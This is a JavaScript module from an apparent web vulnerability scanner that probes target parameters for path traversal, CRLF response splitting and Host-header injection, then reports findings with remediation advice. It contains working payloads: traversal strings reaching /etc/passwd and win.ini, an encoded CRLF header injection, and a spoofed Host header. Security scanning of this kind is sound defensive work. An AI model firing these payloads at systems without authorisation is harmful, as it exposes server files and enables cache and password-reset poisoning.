// Active path-traversal / LFI, CRLF (response splitting), and Host-header
// injection testing.
import { request } from '../../util/http.js';
import { sendPayload, selectPoints, pointLabel } from '../inject.js';
import { finding } from '../finding.js';

const CAT = 'Web Application';
const MOD = 'Path Traversal / CRLF / Host (Active)';

const LFI_PAYLOADS = [
  '../../../../../../etc/passwd',
  '....//....//....//....//etc/passwd',
  '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
  '/etc/passwd',
  '../../../../../../windows/win.ini',
];
const PASSWD = /root:.*?:0:0:/;
const WININI = /\[fonts\]|\[extensions\]|for 16-bit app support/i;

export default {
  id: 'pathtraversal',
  name: 'Path Traversal / CRLF / Host (Active)',
  category: CAT,
  default: false,
  needsCrawl: true,
  async run(ctx) {
    const surface = ctx.surface;
    if (!surface) return { findings: [] };
    const points = selectPoints(surface, ctx.budget?.activePoints || 50);
    const findings = [];
    const reported = new Set();

    // --- Path traversal / LFI ---
    for (const { point, param } of points) {
      const key = `lfi|${point.url}|${param}`;
      if (reported.has(key)) continue;
      for (const pl of LFI_PAYLOADS) {
        const res = await sendPayload(point, param, pl, { timeout: 9000 });
        if (!res.ok) continue;
        const body = res.body || '';
        if (PASSWD.test(body) || WININI.test(body)) {
          reported.add(key);
          findings.push(
            finding({
              module: MOD, category: CAT, severity: 'high', cvss: 7.5,
              title: `Path Traversal / Local File Inclusion in "${param}"`,
              description:
                `Supplying a directory-traversal sequence in \`${param}\` returned the contents of a sensitive system file (matched ${PASSWD.test(body) ? '/etc/passwd' : 'win.ini'}). This confirms path traversal, allowing an attacker to read arbitrary files on the server (configuration, source, credentials).`,
              evidence: `${pointLabel(point, param)}\nPayload: ${pl}\nLeaked content matched system-file signature.`,
              recommendation:
                'Resolve and canonicalise file paths, then verify they remain within an allow-listed base directory. Reject traversal sequences; prefer opaque IDs mapped server-side to files.',
              owasp: 'A01:2021 Broken Access Control', cwe: 'CWE-22',
              references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
            })
          );
          ctx.log(`Path traversal confirmed: ${param} @ ${point.url}`, 'warn');
          break;
        }
      }
    }

    // --- CRLF / HTTP response splitting (query points only) ---
    for (const { point, param } of points.filter((p) => p.point.where === 'query')) {
      const key = `crlf|${point.url}|${param}`;
      if (reported.has(key)) continue;
      const marker = 'crlf' + Math.random().toString(36).slice(2, 7);
      const payload = `test%0d%0aX-Injected-${marker}:1`;
      const u = new URL(point.url);
      u.searchParams.set(param, payload);
      const res = await request(u.toString(), { redirect: 'manual', readBody: false, timeout: 9000 });
      if (res.ok && res.headers[`x-injected-${marker}`.toLowerCase()] != null) {
        reported.add(key);
        findings.push(
          finding({
            module: MOD, category: CAT, severity: 'medium', cvss: 6.1,
            title: `CRLF Injection / HTTP Response Splitting in "${param}"`,
            description:
              `A CRLF sequence injected into \`${param}\` was interpreted by the server, producing an attacker-controlled response header (X-Injected-${marker}). CRLF injection enables header injection, response splitting, and cache poisoning.`,
            evidence: `${pointLabel(point, param)}\nPayload: ${payload}\nInjected header reflected in response.`,
            recommendation: 'Strip/encode CR and LF characters from any user input placed into response headers; use framework header APIs that reject control characters.',
            owasp: 'A03:2021 Injection', cwe: 'CWE-93',
          })
        );
        ctx.log(`CRLF injection confirmed: ${param} @ ${point.url}`, 'warn');
      }
    }

    // --- Host header injection ---
    const evilHost = 'evil-host-probe.example';
    const hres = await request(ctx.target.url, {
      headers: { Host: evilHost },
      redirect: 'manual', timeout: 9000,
    });
    if (hres.ok) {
      const loc = hres.location || '';
      const reflectedInBody = (hres.body || '').includes(evilHost);
      if (loc.includes(evilHost) || reflectedInBody) {
        findings.push(
          finding({
            module: MOD, category: CAT, severity: 'medium', cvss: 6.1,
            title: 'Host Header Injection',
            description:
              `The application reflected an attacker-supplied Host header (\`${evilHost}\`) into ${loc.includes(evilHost) ? 'a redirect Location header' : 'the response body'}. This can be abused for password-reset poisoning, cache poisoning, and routing-based attacks.`,
            evidence: `Sent Host: ${evilHost}\n${loc.includes(evilHost) ? `Location: ${loc}` : 'Reflected in body'}`,
            recommendation: 'Validate the Host header against an allow-list of expected domains; use absolute, configured URLs rather than deriving them from the Host header.',
            owasp: 'A05:2021 Security Misconfiguration', cwe: 'CWE-644',
          })
        );
        ctx.log('Host header injection detected.', 'warn');
      }
    }

    return { findings };
  },
};
